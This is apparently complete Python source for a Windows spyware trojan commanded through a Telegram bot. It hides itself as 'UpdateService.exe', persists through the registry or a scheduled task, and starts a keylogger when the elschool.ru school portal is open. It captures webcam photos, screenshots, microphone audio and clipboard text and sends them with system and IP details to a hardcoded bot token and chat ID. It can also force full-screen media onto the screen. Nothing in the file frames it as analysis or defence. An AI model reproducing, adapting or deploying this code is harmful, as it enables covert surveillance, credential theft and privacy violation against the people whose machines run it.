
import asyncio
import os
import sys
import threading
import time
import socket
import platform
import requests
import win32clipboard
import win32gui
import win32process
import psutil
import pyautogui
import cv2
import wave
import pygame
from datetime import datetime
from pynput import keyboard
from telegram import Update
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
from PIL import Image
import winreg
import shutil

def get_base_path():
    if getattr(sys, 'frozen', False):
        return os.path.dirname(sys.executable)
    return os.path.dirname(os.path.abspath(__file__))

def get_temp_dir():
    return os.getenv('TEMP') or os.getenv('TMP') or os.path.expanduser('~')

BOT_TOKEN = "8557189681:AAGpYzv3QJuO7RjJRkuIbhFuXIpEXJmcmK8"
CHAT_ID = "185828572"
MONITORED_URLS = ["elschool.ru"]

def add_to_startup():
    try:
        import time
        time.sleep(2)
        
        exe_path = sys.executable if getattr(sys, 'frozen', False) else os.path.abspath(__file__)
        
        appdata = os.getenv('APPDATA')
        target_dir = os.path.join(appdata, 'WindowsUpdate')
        os.makedirs(target_dir, exist_ok=True)
        target_path = os.path.join(target_dir, 'UpdateService.exe')
        
        if not os.path.exists(target_path) and exe_path != target_path:
            time.sleep(1)
            shutil.copy2(exe_path, target_path)
            exe_path = target_path
            
            try:
                import ctypes
                FILE_ATTRIBUTE_HIDDEN = 0x02
                FILE_ATTRIBUTE_SYSTEM = 0x04
                ctypes.windll.kernel32.SetFileAttributesW(target_path, FILE_ATTRIBUTE_HIDDEN | FILE_ATTRIBUTE_SYSTEM)
            except:
                pass
        
        try:
            key_path = r"Software\Microsoft\Windows\CurrentVersion\Run"
            key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, key_path, 0, winreg.KEY_ALL_ACCESS)
            winreg.SetValueEx(key, "WindowsUpdateService", 0, winreg.REG_SZ, exe_path)
            winreg.CloseKey(key)
        except Exception as e:
            try:
                import subprocess
                task_name = "WindowsUpdateService"
                cmd = f'schtasks /create /tn "{task_name}" /tr "{exe_path}" /sc onlogon /rl highest /f'
                subprocess.run(cmd, shell=True, capture_output=True, creationflags=0x08000000)
            except:
                pass
        
        return True
    except Exception as e:
        return False

def get_system_info():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        try:
            external_ip = requests.get('https://api.ipify.org', timeout=5).text
        except:
            external_ip = "Недоступен"
        os_info = f"{platform.system()} {platform.release()}"
        return {'hostname': hostname, 'local_ip': local_ip, 'external_ip': external_ip, 'os': os_info}
    except Exception as e:
        return {'error': str(e)}

class KeyLogger:
    def __init__(self):
        self.log = []
        self.is_running = False
        self.listener = None
        self.current_window = None
        
    def get_active_window_title(self):
        try:
            window = win32gui.GetForegroundWindow()
            return win32gui.GetWindowText(window)
        except:
            return None
    
    def on_press(self, key):
        try:
            window_title = self.get_active_window_title()
            if window_title and window_title != self.current_window:
                self.current_window = window_title
                self.log.append(f'\n[Окно: {window_title}]\n')
            
            try:
                char = key.char
                if char:
                    self.log.append(char)
            except AttributeError:
                special_keys = {
                    keyboard.Key.space: ' ', 
                    keyboard.Key.enter: '\n', 
                    keyboard.Key.tab: '\t', 
                    keyboard.Key.backspace: '[←]'
                }
                self.log.append(special_keys.get(key, f'[{key.name if hasattr(key, "name") else key}]'))
        except Exception as e:
            pass
    
    def start(self):
        if not self.is_running:
            self.log = []
            self.current_window = None
            self.is_running = True
            self.listener = keyboard.Listener(on_press=self.on_press)
            self.listener.start()
    
    def stop(self):
        if self.is_running:
            self.is_running = False
            if self.listener:
                self.listener.stop()
                self.listener = None
            result = ''.join(self.log)
            self.log = []
            self.current_window = None
            return result
        return ""
    
    def get_log(self):
        return ''.join(self.log)

class BrowserMonitor:
    def __init__(self, callback, monitored_urls):
        self.callback = callback
        self.monitored_urls = monitored_urls
        self.is_monitoring = False
        self.current_url = None
        self.thread = None
    def get_browser_url(self):
        try:
            window = win32gui.GetForegroundWindow()
            title = win32gui.GetWindowText(window)
            browsers = ['Chrome', 'Firefox', 'Edge', 'Opera']
            for browser in browsers:
                if browser.lower() in title.lower():
                    return title
            return None
        except:
            return None
    def check_url(self):
        title = self.get_browser_url()
        if title:
            for url in self.monitored_urls:
                if url.lower() in title.lower():
                    return url
        return None
    def monitor_loop(self):
        while self.is_monitoring:
            detected_url = self.check_url()
            if detected_url and not self.current_url:
                self.current_url = detected_url
                self.callback('opened', detected_url)
            elif not detected_url and self.current_url:
                self.callback('closed', self.current_url)
                self.current_url = None
            time.sleep(2)
    def start(self):
        if not self.is_monitoring:
            self.is_monitoring = True
            self.thread = threading.Thread(target=self.monitor_loop, daemon=True)
            self.thread.start()
    def stop(self):
        self.is_monitoring = False

class MediaPlayer:
    def __init__(self):
        self.current_file = None
        self.playing = False
    
    def play_audio(self, filepath):
        try:
            import ctypes
            import os
            abs_path = os.path.abspath(filepath).replace('/', '\\')
            
            if not os.path.exists(abs_path):
                print(f"Файл не найден: {abs_path}")
                return False
            
            winmm = ctypes.windll.winmm
            
            winmm.mciSendStringW('close audio', None, 0, None)
            
            ext = os.path.splitext(filepath)[1].lower()
            if ext == '.mp3':
                file_type = 'mpegvideo'
            elif ext == '.wav':
                file_type = 'waveaudio'
            else:
                file_type = 'mpegvideo'
            
            result = winmm.mciSendStringW(f'open "{abs_path}" type {file_type} alias audio', None, 0, None)
            if result == 0:
                winmm.mciSendStringW('play audio', None, 0, None)
                self.current_file = filepath
                self.playing = True
                return True
            else:
                print(f"MCI ошибка: {result}")
                return False
                
        except Exception as e:
            print(f"Ошибка воспроизведения: {e}")
            return False
    
    def stop_audio(self):
        try:
            import ctypes
            winmm = ctypes.windll.winmm
            winmm.mciSendStringW('stop audio', None, 0, None)
            winmm.mciSendStringW('close audio', None, 0, None)
            
            self.playing = False
            
            if self.current_file and os.path.exists(self.current_file):
                for _ in range(5):
                    try:
                        time.sleep(0.3)
                        os.remove(self.current_file)
                        break
                    except:
                        pass
            self.current_file = None
        except:
            pass

def show_fullscreen_image(image_path, duration):
    try:
        import tkinter as tk
        from PIL import ImageTk
        root = tk.Tk()
        root.attributes('-fullscreen', True)
        root.attributes('-topmost', True)
        root.configure(background='black')
        root.protocol("WM_DELETE_WINDOW", lambda: None)
        root.bind('<Escape>', lambda e: None)
        img = Image.open(image_path)
        screen_width = root.winfo_screenwidth()
        screen_height = root.winfo_screenheight()
        img = img.resize((screen_width, screen_height), Image.Resampling.LANCZOS)
        photo = ImageTk.PhotoImage(img)
        label = tk.Label(root, image=photo, bg='black')
        label.pack()
        root.after(duration * 1000, root.destroy)
        root.mainloop()
        try:
            if os.path.exists(image_path):
                os.remove(image_path)
        except:
            pass
    except Exception as e:
        print(f"Ошибка: {e}")

def play_fullscreen_video(video_path):
    try:
        import cv2
        import threading
        
        if not os.path.exists(video_path):
            print(f"Файл не найден: {video_path}")
            return
        
        audio_file = None
        audio_started = False
        try:
            try:
                from moviepy.editor import VideoFileClip
            except:
                import moviepy
                VideoFileClip = moviepy.VideoFileClip
            
            video_clip = VideoFileClip(video_path)
            if video_clip.audio is not None:
                temp_dir = os.getenv('TEMP') or os.getenv('TMP') or 'temp'
                audio_file = os.path.join(temp_dir, f"video_audio_{os.path.basename(video_path)}.mp3")
                video_clip.audio.write_audiofile(audio_file, verbose=False, logger=None)
                video_clip.close()
                print(f"Аудио извлечено: {audio_file}")
                
                def play_audio_mci():
                    try:
                        import ctypes
                        winmm = ctypes.windll.winmm
                        abs_path = os.path.abspath(audio_file).replace('/', '\\')
                        result = winmm.mciSendStringW(f'open "{abs_path}" type mpegvideo alias videoaudio', None, 0, None)
                        if result == 0:
                            winmm.mciSendStringW('play videoaudio', None, 0, None)
                            print("Аудио запущено")
                    except Exception as e:
                        print(f"Ошибка MCI: {e}")
                
                threading.Thread(target=play_audio_mci, daemon=True).start()
                audio_started = True
                time.sleep(0.1)
            else:
                print("Видео без аудио дорожки")
        except ImportError as e:
            print(f"moviepy недоступен: {e}")
            print("Попробуйте: pip uninstall moviepy -y && pip install moviepy==1.0.3")
        except Exception as e:
            print(f"Ошибка извлечения аудио: {e}")
        
        cap = cv2.VideoCapture(video_path)
        if not cap.isOpened():
            print("Не удалось открыть видео")
            try:
                os.remove(video_path)
                if audio_file and os.path.exists(audio_file):
                    os.remove(audio_file)
            except:
                pass
            return
        
        fps = cap.get(cv2.CAP_PROP_FPS) or 30
        frame_delay = int(1000 / fps)
        
        cv2.namedWindow('video', cv2.WND_PROP_FULLSCREEN)
        cv2.setWindowProperty('video', cv2.WND_PROP_FULLSCREEN, cv2.WINDOW_FULLSCREEN)
        cv2.setWindowProperty('video', cv2.WND_PROP_TOPMOST, 1)
        
        while cap.isOpened():
            ret, frame = cap.read()
            if not ret:
                break
            
            cv2.imshow('video', frame)
            
            if cv2.waitKey(frame_delay) & 0xFF == 27:
                break
        
        cap.release()
        cv2.destroyAllWindows()
        
        if audio_started:
            try:
                import ctypes
                winmm = ctypes.windll.winmm
                winmm.mciSendStringW('stop videoaudio', None, 0, None)
                winmm.mciSendStringW('close videoaudio', None, 0, None)
            except:
                pass
        
        time.sleep(0.5)
        for _ in range(5):
            try:
                if os.path.exists(video_path):
                    os.remove(video_path)
                if audio_file and os.path.exists(audio_file):
                    os.remove(audio_file)
                break
            except:
                time.sleep(0.5)
            
    except Exception as e:
        print(f"Ошибка воспроизведения: {e}")
        try:
            cv2.destroyAllWindows()
        except:
            pass
        try:
            if os.path.exists(video_path):
                os.remove(video_path)
            if 'audio_file' in locals() and audio_file and os.path.exists(audio_file):
                os.remove(audio_file)
        except:
            pass

def take_screenshot():
    try:
        temp_dir = get_temp_dir()
        filename = os.path.join(temp_dir, f"screenshot_{datetime.now().strftime('%Y%m%d_%H%M%S')}.png")
        screenshot = pyautogui.screenshot()
        screenshot.save(filename)
        return filename, None
    except Exception as e:
        return None, str(e)

def take_photo():
    try:
        cap = cv2.VideoCapture(0)
        if not cap.isOpened():
            return None, "Камера недоступна"
        ret, frame = cap.read()
        cap.release()
        if ret:
            temp_dir = get_temp_dir()
            filename = os.path.join(temp_dir, f"photo_{datetime.now().strftime('%Y%m%d_%H%M%S')}.jpg")
            cv2.imwrite(filename, frame)
            return filename, None
        return None, "Не удалось сделать фото"
    except Exception as e:
        return None, str(e)

def record_audio(duration=10):
    try:
        import pyaudio
        CHUNK = 1024
        FORMAT = pyaudio.paInt16
        RATE = 44100
        
        p = pyaudio.PyAudio()
        
        device_info = p.get_default_input_device_info()
        max_channels = int(device_info.get('maxInputChannels', 2))
        CHANNELS = min(max_channels, 2)
        
        stream = p.open(format=FORMAT, channels=CHANNELS, rate=RATE, input=True, frames_per_buffer=CHUNK)
        frames = []
        
        for _ in range(0, int(RATE / CHUNK * duration)):
            data = stream.read(CHUNK)
            frames.append(data)
        
        stream.stop_stream()
        stream.close()
        p.terminate()
        
        temp_dir = get_temp_dir()
        filename = os.path.join(temp_dir, f"audio_{datetime.now().strftime('%Y%m%d_%H%M%S')}.wav")
        wf = wave.open(filename, 'wb')
        wf.setnchannels(CHANNELS)
        wf.setsampwidth(p.get_sample_size(FORMAT))
        wf.setframerate(RATE)
        wf.writeframes(b''.join(frames))
        wf.close()
        
        return filename, None
    except Exception as e:
        return None, str(e)

keylogger = KeyLogger()
media_player = MediaPlayer()
browser_monitor = None
app = None

async def send_startup_notification():
    info = get_system_info()
    message = f"ПК запущен!\n\nИмя ПК: {info.get('hostname', 'N/A')}\nЛокальный IP: {info.get('local_ip', 'N/A')}\nВнешний IP: {info.get('external_ip', 'N/A')}\nОС: {info.get('os', 'N/A')}"
    await app.bot.send_message(chat_id=CHAT_ID, text=message)

async def browser_callback(event, url):
    try:
        if event == 'opened':
            if not keylogger.is_running:
                keylogger.start()
                await app.bot.send_message(chat_id=CHAT_ID, text=f"Открыт сайт: {url}\nКейлоггер активирован")
            else:
                await app.bot.send_message(chat_id=CHAT_ID, text=f"Открыт сайт: {url}\n(Кейлоггер уже работает)")
            
            photo_file, _ = take_photo()
            if photo_file:
                try:
                    img = Image.open(photo_file)
                    img.thumbnail((1280, 720), Image.Resampling.LANCZOS)
                    img.save(photo_file, optimize=True, quality=80)
                    with open(photo_file, 'rb') as f:
                        await app.bot.send_photo(chat_id=CHAT_ID, photo=f, caption="Фото")
                    os.remove(photo_file)
                except Exception as e:
                    print(f"Ошибка отправки фото: {e}")
                    try:
                        os.remove(photo_file)
                    except:
                        pass
            
            screen_file, _ = take_screenshot()
            if screen_file:
                try:
                    img = Image.open(screen_file)
                    img.thumbnail((1280, 720), Image.Resampling.LANCZOS)
                    img.save(screen_file, optimize=True, quality=80)
                    with open(screen_file, 'rb') as f:
                        await app.bot.send_photo(chat_id=CHAT_ID, photo=f, caption="Скриншот")
                    os.remove(screen_file)
                except Exception as e:
                    print(f"Ошибка отправки скриншота: {e}")
                    try:
                        os.remove(screen_file)
                    except:
                        pass
        elif event == 'closed':
            if keylogger.is_running:
                log = keylogger.stop()
                if log:
                    await app.bot.send_message(chat_id=CHAT_ID, text=f"Сайт закрыт: {url}\n\nЛог:\n{log[:4000]}")
                else:
                    await app.bot.send_message(chat_id=CHAT_ID, text=f"Сайт закрыт: {url}\n(Лог пуст)")
    except Exception as e:
        print(f"Ошибка в browser_callback: {e}")

async def start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        return
    commands = """Команды:
/info - Информация о системе
/screenshot - Скриншот
/photo - Фото с камеры
/record <сек> - Запись аудио
/keylog_start - Запустить кейлоггер
/keylog_stop - Остановить кейлоггер
/keylog_get - Получить лог
/get_clipboard - Буфер обмена
/stop_music - Остановить музыку

Медиа:
Голосовое - автоматически воспроизводится
Аудио файл + /start_music - воспроизвести
Фото + /start_photo <сек> - показать
Видео + /start_video - воспроизвести"""
    await update.message.reply_text(commands)

async def info_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        return
    info = get_system_info()
    message = f"Система:\n\nИмя: {info.get('hostname')}\nIP: {info.get('local_ip')}\nВнешний IP: {info.get('external_ip')}\nОС: {info.get('os')}"
    await update.message.reply_text(message)

async def screenshot_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        return
    try:
        filename, error = take_screenshot()
        if filename:
            img = Image.open(filename)
            img.thumbnail((1920, 1080), Image.Resampling.LANCZOS)
            img.save(filename, optimize=True, quality=85)
            
            with open(filename, 'rb') as f:
                await update.message.reply_photo(photo=f, caption="Скриншот")
            os.remove(filename)
        else:
            await update.message.reply_text(f"Ошибка: {error}")
    except Exception as e:
        await update.message.reply_text(f"Ошибка: {str(e)}")

async def photo_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        return
    try:
        filename, error = take_photo()
        if filename:
            img = Image.open(filename)
            img.thumbnail((1920, 1080), Image.Resampling.LANCZOS)
            img.save(filename, optimize=True, quality=85)
            
            with open(filename, 'rb') as f:
                await update.message.reply_photo(photo=f, caption="Фото")
            os.remove(filename)
        else:
            await update.message.reply_text(f"Ошибка: {error}")
    except Exception as e:
        await update.message.reply_text(f"Ошибка: {str(e)}")

async def record_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        return
    try:
        duration = 10
        if context.args and context.args[0].isdigit():
            duration = min(int(context.args[0]), 60)
        await update.message.reply_text(f"Записываю {duration}с...")
        filename, error = record_audio(duration)
        if filename:
            with open(filename, 'rb') as f:
                await update.message.reply_audio(audio=f, caption=f"{duration}с")
            os.remove(filename)
        else:
            await update.message.reply_text(f"Ошибка: {error}")
    except Exception as e:
        await update.message.reply_text(f"Ошибка: {str(e)}")

async def keylog_start_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        return
    keylogger.start()
    await update.message.reply_text("Кейлоггер запущен")

async def keylog_stop_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        return
    log = keylogger.stop()
    await update.message.reply_text(f"Лог:\n\n{log[:4000]}" if log else "Лог пуст")

async def keylog_get_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        return
    log = keylogger.get_log()
    await update.message.reply_text(f"Лог:\n\n{log[:4000]}" if log else "Лог пуст")

async def clipboard_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        return
    try:
        win32clipboard.OpenClipboard()
        try:
            data = win32clipboard.GetClipboardData(win32clipboard.CF_UNICODETEXT)
        except:
            try:
                data = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
                if isinstance(data, bytes):
                    data = data.decode('utf-8', errors='ignore')
            except:
                data = None
        win32clipboard.CloseClipboard()
        
        if data:
            await update.message.reply_text(f"Буфер:\n\n{data[:4000]}")
        else:
            await update.message.reply_text("Буфер пуст или содержит не текст")
    except Exception as e:
        await update.message.reply_text(f"Ошибка: {str(e)}")

async def stop_music_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        return
    media_player.stop_audio()
    await update.message.reply_text("Остановлено")

async def handle_media(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if str(update.effective_chat.id) != CHAT_ID:
        return
    try:
        caption = update.message.caption or ""
        
        if update.message.voice:
            try:
                temp_dir = os.getenv('TEMP') or os.getenv('TMP') or 'temp'
                os.makedirs(temp_dir, exist_ok=True)
                
                file = await update.message.voice.get_file()
                ogg_path = os.path.join(temp_dir, f"voice_{update.message.message_id}.ogg")
                await file.download_to_drive(ogg_path)
                
                if not os.path.exists(ogg_path):
                    await update.message.reply_text("Ошибка: файл не скачался")
                    return
                
                mp3_path = os.path.join(temp_dir, f"voice_{update.message.message_id}.mp3")
                converted = False
                
                try:
                    from pydub import AudioSegment
                    audio = AudioSegment.from_ogg(ogg_path)
                    audio.export(mp3_path, format="mp3", bitrate="128k")
                    if os.path.exists(mp3_path):
                        try:
                            os.remove(ogg_path)
                        except:
                            pass
                        filepath = mp3_path
                        converted = True
                except:
                    pass
                
                if not converted:
                    try:
                        import soundfile as sf
                        import sounddevice as sd
                        
                        data, samplerate = sf.read(ogg_path)
                        
                        def play_and_cleanup():
                            try:
                                sd.play(data, samplerate)
                                sd.wait()
                                time.sleep(0.5)
                                try:
                                    os.remove(ogg_path)
                                except:
                                    pass
                            except Exception as e:
                                print(f"Ошибка воспроизведения: {e}")
                        
                        threading.Thread(target=play_and_cleanup, daemon=True).start()
                        await update.message.reply_text("Голосовое воспроизводится")
                        return
                    except ImportError:
                        await update.message.reply_text("Установите библиотеки:\npip install soundfile sounddevice")
                        try:
                            os.remove(ogg_path)
                        except:
                            pass
                        return
                    except Exception as e:
                        await update.message.reply_text(f"Ошибка: {str(e)}")
                        try:
                            os.remove(ogg_path)
                        except:
                            pass
                        return
                
                if media_player.play_audio(filepath):
                    await update.message.reply_text("Голосовое воспроизводится")
                else:
                    await update.message.reply_text("Ошибка воспроизведения")
                    try:
                        os.remove(filepath)
                    except:
                        pass
            except Exception as e:
                await update.message.reply_text(f"Ошибка: {str(e)}")
            return
        
        if update.message.audio and "/start_music" in caption:
            try:
                temp_dir = os.getenv('TEMP') or os.getenv('TMP') or 'temp'
                os.makedirs(temp_dir, exist_ok=True)
                file = await update.message.audio.get_file()
                file_name = update.message.audio.file_name or "audio.mp3"
                ext = os.path.splitext(file_name)[1] or ".mp3"
                filepath = os.path.join(temp_dir, f"audio_{update.message.message_id}{ext}")
                await file.download_to_drive(filepath)
                if media_player.play_audio(filepath):
                    await update.message.reply_text("Музыка воспроизводится")
                else:
                    await update.message.reply_text("Ошибка воспроизведения")
                    try:
                        os.remove(filepath)
                    except:
                        pass
            except Exception as e:
                await update.message.reply_text(f"Ошибка: {str(e)}")
            return
        
        if update.message.photo and "/start_photo" in caption:
            try:
                temp_dir = os.getenv('TEMP') or os.getenv('TMP') or 'temp'
                os.makedirs(temp_dir, exist_ok=True)
                duration = 10
                parts = caption.split()
                for i, part in enumerate(parts):
                    if part == "/start_photo" and i + 1 < len(parts) and parts[i + 1].isdigit():
                        duration = int(parts[i + 1])
                        break
                file = await update.message.photo[-1].get_file()
                filepath = os.path.join(temp_dir, f"photo_{update.message.message_id}.jpg")
                await file.download_to_drive(filepath)
                await update.message.reply_text(f"Показываю {duration}с...")
                threading.Thread(target=show_fullscreen_image, args=(filepath, duration), daemon=True).start()
            except Exception as e:
                await update.message.reply_text(f"Ошибка: {str(e)}")
            return
        
        if update.message.video and "/start_video" in caption:
            try:
                temp_dir = os.getenv('TEMP') or os.getenv('TMP') or 'temp'
                os.makedirs(temp_dir, exist_ok=True)
                file = await update.message.video.get_file()
                filepath = os.path.join(temp_dir, f"video_{update.message.message_id}.mp4")
                await file.download_to_drive(filepath)
                await update.message.reply_text("Воспроизвожу...")
                threading.Thread(target=play_fullscreen_video, args=(filepath,), daemon=True).start()
            except Exception as e:
                await update.message.reply_text(f"Ошибка: {str(e)}")
            return
    except Exception as e:
        await update.message.reply_text(f"Ошибка: {str(e)}")
    if update.message.audio and "/start_music" in caption:
        file = await update.message.audio.get_file()
        file_name = update.message.audio.file_name or "audio.mp3"
        ext = os.path.splitext(file_name)[1] or ".mp3"
        filepath = f"temp_audio_{update.message.message_id}{ext}"
        await file.download_to_drive(filepath)
        if media_player.play_audio(filepath):
            await update.message.reply_text("Музыка воспроизводится")
        else:
            await update.message.reply_text("Ошибка воспроизведения")
        return
    if update.message.photo and "/start_photo" in caption:
        duration = 10
        parts = caption.split()
        for i, part in enumerate(parts):
            if part == "/start_photo" and i + 1 < len(parts) and parts[i + 1].isdigit():
                duration = int(parts[i + 1])
                break
        file = await update.message.photo[-1].get_file()
        filepath = f"temp_photo_{update.message.message_id}.jpg"
        await file.download_to_drive(filepath)
        await update.message.reply_text(f"Показываю {duration}с...")
        threading.Thread(target=show_fullscreen_image, args=(filepath, duration), daemon=True).start()
        return
    if update.message.video and "/start_video" in caption:
        file = await update.message.video.get_file()
        filepath = f"temp_video_{update.message.message_id}.mp4"
        await file.download_to_drive(filepath)
        await update.message.reply_text("Воспроизвожу...")
        threading.Thread(target=play_fullscreen_video, args=(filepath,), daemon=True).start()
        return

def main():
    global app, browser_monitor
    add_to_startup()
    
    from telegram.request import HTTPXRequest
    request = HTTPXRequest(
        connection_pool_size=8,
        connect_timeout=30.0,
        read_timeout=60.0,
        write_timeout=60.0,
        pool_timeout=30.0
    )
    app = Application.builder().token(BOT_TOKEN).request(request).build()
    app.add_handler(CommandHandler("start", start_command))
    app.add_handler(CommandHandler("info", info_command))
    app.add_handler(CommandHandler("screenshot", screenshot_command))
    app.add_handler(CommandHandler("photo", photo_command))
    app.add_handler(CommandHandler("record", record_command))
    app.add_handler(CommandHandler("keylog_start", keylog_start_command))
    app.add_handler(CommandHandler("keylog_stop", keylog_stop_command))
    app.add_handler(CommandHandler("keylog_get", keylog_get_command))
    app.add_handler(CommandHandler("get_clipboard", clipboard_command))
    app.add_handler(CommandHandler("stop_music", stop_music_command))
    app.add_handler(MessageHandler(filters.PHOTO | filters.AUDIO | filters.VOICE | filters.VIDEO, handle_media))
    
    def browser_callback_sync(event, url):
        try:
            loop = asyncio.new_event_loop()
            asyncio.set_event_loop(loop)
            loop.run_until_complete(browser_callback(event, url))
            loop.close()
        except Exception as e:
            print(f"Ошибка в browser_callback_sync: {e}")
    
    browser_monitor = BrowserMonitor(browser_callback_sync, MONITORED_URLS)
    browser_monitor.start()
    
    async def post_init(application):
        await send_startup_notification()
    
    app.post_init = post_init
    app.run_polling(allowed_updates=Update.ALL_TYPES)

if __name__ == "__main__":
    main()
